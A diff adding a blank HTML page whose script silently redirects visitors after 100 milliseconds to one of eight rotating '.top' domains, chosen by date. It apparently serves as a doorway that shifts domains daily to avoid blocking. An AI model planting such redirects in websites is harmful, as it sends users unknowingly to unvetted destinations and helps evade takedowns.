@@ -1,0 +1,33 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title></title>
+</head>
+
+<body>
+
+<script type="text/javascript">
+var url2 = new Array();
+var url3="";
+var istiao="1";
+
+url2.push("app.cav1.top/");
+url2.push("app.cav2.top/");
+url2.push("app.cav3.top/");
+url2.push("app.cav4.top/");
+url2.push("app.cav5.top/");
+url2.push("app.cav10.top/");
+url2.push("app.cav11.top/");
+url2.push("app.cav12.top/");
+
+var timestamp = Date.parse(new Date());
+var day1=parseInt((timestamp+8*3600000)/86400000);
+url3 = "https://" + url2[(day1%url2.length)];
+setTimeout('location.href=url3',100);
+</script>
+
+
+</body>
+
+</html>
